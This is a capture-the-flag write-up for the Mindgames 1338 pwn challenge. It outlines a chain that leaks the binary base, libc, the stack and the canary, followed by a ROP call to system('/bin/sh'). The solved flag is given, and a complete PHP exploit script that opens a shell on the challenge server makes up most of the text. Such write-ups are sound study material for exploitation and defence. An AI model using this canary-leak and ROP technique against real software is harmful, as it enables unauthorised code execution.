# Mindgames 1338 - BalCCon2k20 CTF (pwn, 470, 8 solved)
## Introduction

Mindgames 1338 is a pwn task. This is the third and last challenge of the
Mindgames serie (Mindgames 1336, 1337, 1338). This challenge has PIE and stack
canaries.

A Linux ELF file is provided. It is a guessing game. The highest score belongs
to a randomly generated Star Wars character, but can be replaced by the user's
name.

## Reverse engineering

The reverse engineering has been explained in Mindgames 1336's and Mindgames
1337's writeups.

## Exploitation

The exploitation here is slightly more complicated due to the presence of stack
canaries : not only is it required to leak the binary's base address, but it is
also required to leak the stack canary to overwrite it.

The canary is stored on the stack. A pointer to the stack can be found in the
libc (`environ`, which points to the program's environment variables).

The exploitation becomes:
1. leak PIE by overwriting last byte of `player`
2. leak libc by pointing `player` to `__libc_start_main`
3. leak stack by pointing `player` to libc's `environ` pointer
4. leak canary by pointing `player` to `environ - 0x110`
5. ROP to call `system("/bin/sh")`

**Flag**: `BCTF{0h_no!_N0w_y0u_killed_my_canary!_Your_mind_really_is_a_weapon!}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Socket.php";

// PIE
const LSM     = 0x00003fe0;
const PUTS    = 0x00001040;

// libc
const ENVIRON = 0x001be080;
const POPRDI  = 0x00023a5f;
const BINSH   = 0x00181519;
const SYSTEM  = 0x000449c0;

const HOST = "pwn.institute";
const PORT = 41338;

function menu(Tube $t)
{
	$t->expectLine("What do you want to do?");
	$t->expectLine(" 1) Show Highscore");
	$t->expectLine(" 2) Play the game");
	$t->expectLine(" 3) Exit");
	$t->expect("> ");
}

function hs(Tube $t)
{
	menu($t);
	$t->write("1\n");

	$t->expectLine("Current highscore:");
	$line = $t->readLine();

	list($score, , $player) = explode("\t", $line, 3);
	$score |= 0;
	$player = substr($player, 1);

	return [$score, $player];
}

function play(Tube $t, $name, $count = 0)
{
	global $ffi;

	menu($t);
	$t->write("2\n");

	$t->expectLine("Can you guess my numbers?");
	$t->expect("> ");

	for($i = 0; $i < $count; $i++) {
		$guess = $ffi->rand();
		$t->write("$guess\n");
	}

	for($i = 0; $i < $count; $i++) {
		$t->expectLine("You were lucky this time!");
		$t->expect(">");
	}

	$t->write("-1\n");
	$t->expectLine("Game over!");
	$t->expectLine("New Highscore! Amazing!");

	$t->expect("Give me your name: ");
	$t->write($name);
}

printf("[*] Creating process\n");
$time = microtime(true);

$t = new Socket(HOST, PORT);
$date = strftime("%Y-%m-%d %H:%M:%S"); // it's okay because we use NTP ;-)
$t->expectLine("Hello there! It's $date and the weather looks pretty nice!");

//$t->expect("Hello there! It's ");
//$date = $t->read(strlen("2020-09-25 21:26:35"));
//$t->expectLine(" and the weather looks pretty nice!");
$t->expectLine("");
$t->expectLine("");
$t->expectLine("We should play a game of the mind!");
$t->expect("> ");

$ffi = FFI::load("rand.h");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$time = strtotime($date);
$ffi->srand($time);
$ffi->rand(); // player
$score = $ffi->rand(); // score

printf("[*] Leak addresses\n");

/* Leak */
$payload  = str_pad("XeR", 0x20, "\x00");
$payload .= pack("Q", 0); // faster
$payload .= "\xe8";

play($t, $payload, 32);
$hs   = hs($t);
$addr = str_pad(substr($hs[1], 0, 8), 8, "\x00");
$base = unpack("Q", $addr)[1] - 0x40e8;

printf("[+] base: %X\n", $base);

$payload  = str_pad("XeR", 0x20, "\x00");
$payload .= pack("Q", 0); // faster
$payload .= pack("Q", $base + LSM);

play($t, $payload);
$hs   = hs($t);
$addr = str_pad(substr($hs[1], 0, 8), 8, "\x00");
$addr = unpack("Q", $addr)[1];
$libc  = $addr & ~0xFFF;
$libc -= 0x23000;

printf("[+] libc: %X\n", $libc);


$payload  = str_pad("XeR", 0x20, "\x00");
$payload .= pack("Q", 0); // faster
$payload .= pack("Q", $libc + ENVIRON);

play($t, $payload);
$hs    = hs($t);
$addr  = str_pad(substr($hs[1], 0, 8), 8, "\x00");
$stack = unpack("Q", $addr)[1];

printf("[+] stack: %X\n", $stack);


$payload  = str_pad("XeR", 0x20, "\x00");
$payload .= pack("Q", 0); // faster
$payload .= pack("Q", $stack - 0x110 + 1);

play($t, $payload);
$hs     = hs($t);
$leak   = "\x00" . substr($hs[1], 0, 7);
$canary = unpack("Q", $leak)[1];
assert(8 === strlen($leak));

printf("[+] canary: %X\n", $canary);
printf("\n");


/* actual pwn */
$payload  = str_repeat("x", 0x108);
$payload .= pack("Q", $canary); // canary

$payload .= pack("Q", 0xdeadbeef); // rbp
$payload .= pack("Q*",
	$libc + POPRDI, $libc + BINSH,
	$base + PUTS,

	$libc + POPRDI, $libc + BINSH,
	$libc + SYSTEM,

	-1
); // rip

play($t, $payload);


printf("[!] shell\n");
$t->pipe();
```